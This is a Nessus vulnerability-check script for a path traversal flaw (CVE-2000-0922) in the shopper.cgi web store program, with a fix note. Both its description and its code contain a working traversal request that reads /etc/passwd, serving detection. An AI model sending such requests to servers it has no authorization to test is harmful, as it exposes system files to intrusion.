#
# This script was written by Thomas Reinke <reinke@e-softinc.com>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10533);
 script_bugtraq_id(1776);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0922");
 
 
 name["english"] = "Web Shopper remote file retrieval";
 script_name(english:name["english"]);
 
 desc["english"] = "Byte's Interactive Web Shopper
(shopper.cgi) allows for retrieval of arbitrary files
from the web server. Both Versions 1.0 and 2.0 are
affected.

Example:
    GET /cgi-bin/shopper.cgi?newpage=../../../../etc/passwd

will return /etc/passwd.

Solution: Uncomment the #$debug=1 variable in the script
so that it will check for, and disallow, viewing of
arbitrary files.

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Web Shopper remote file retrieval";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Thomas Reinke");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 buf = string(dir, "/shopper.cgi?newpage=../../../../../../etc/passwd");
 buf = http_get(item:buf, port:port);
 rep = http_keepalive_send_recv(port:port, data:buf);
 if(rep == NULL)exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
  	security_hole(port);
}
